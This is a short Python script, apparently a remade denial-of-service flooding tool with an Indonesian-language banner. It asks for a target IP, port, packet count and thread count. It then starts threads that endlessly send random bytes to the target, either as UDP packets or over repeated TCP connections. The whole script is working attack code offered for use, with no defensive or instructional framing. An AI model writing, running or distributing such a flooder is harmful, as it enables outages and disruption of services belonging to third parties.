import random
import socket
import threading
import os

os.system("clear")
print("╔════════════════╗")
print("══G r i z z l y ══")
print("╚════════════════╝")
print("TOOLS BY ΣXCRUSHER")
print("REMAKE BY Grizzly")
ip = str(input(" TARGET IP:"))
port = int(input(" TARGET PORT:"))
choice = str(input(" GAS GAK NI?(y/n):"))
times = int(input(" PAKET:"))
threads = int(input(" ONGKIR:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" | SEDANG MENGIRIM PAKET... |")
		except:
			print("[!] | SERVER HAS BEEN SLEEPING |")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Grizzly X EXCRUSHER")
		except:
			s.close()
			print("[*] |PAKET SEDANG OTW|")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
